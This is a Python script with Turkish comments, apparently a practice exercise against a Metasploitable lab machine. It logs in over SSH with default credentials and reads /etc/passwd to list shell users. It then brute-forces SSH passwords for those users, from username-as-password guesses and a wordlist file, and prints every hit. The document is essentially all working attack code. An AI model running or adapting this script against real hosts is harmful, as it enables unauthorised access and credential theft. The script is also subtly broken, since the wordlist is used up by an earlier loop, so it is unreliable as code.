import paramiko
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
ip = "192.168.56.101"
port = 22
username = "msfadmin"
password = "msfadmin"

ssh.connect(ip,port=port,username=username,password=password)

command = 'cat /etc/passwd'

stdin, stdout, stderr = ssh.exec_command(command)

cdm_output = stdout.read()
ssh.close()

#print(cdm_output)

etcpasswd = cdm_output.decode().split("\n")
user_list = []

for ep in etcpasswd:

    if "/bin/bash" in ep or "bin/sh" in ep: #Bu şekilde yazdığımızda sadece "bin/bash ve bin/sh" olanları karşımıza geçirecektir.

        #print(ep)

 #Aşağıda ise gerçek hayat senaryosuna uygun olan  BruteForceAttack'a yönelik bir senaryo oluşturulmuştur.
#Yukarıda var olan bin/bash ve bin/sh dosyaları üzerinden kullanıcılara ulaşılmak hedeflenmiştir.
#Ardından user printini de yorum satırına alarak bulduğumuz kullanıcıları bir liste olarak yazdırıyoruz.

        user = ep.split(":")[0]
        #print(user)
        user_list.append(user)
print(user_list)
f=open("pass_list.txt", "r")

for password in f:
    print(password.strip())

def trySsh(user,password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    success = False

    try:
        ssh.connect(ip, username=user, password=password.strip(), timeout=0.1, banner_timeout=0.1)

        success = True
    except Exception as e:
        pass
    finally:
        ssh.close()
        return success

for user in user_list:
   if (trySsh(user,user)):
       print("Bağlantı Kuruldu! Kullanıcı Adı:", user,"Şifre:",user)
   else:
       for password in f:
        # print(user,":",password.strip())
        if(trySsh(user,password)):
            print("Bağlantı Kuruldu! Kullanıcı Adı:", user, "Şifre:", password.strip())

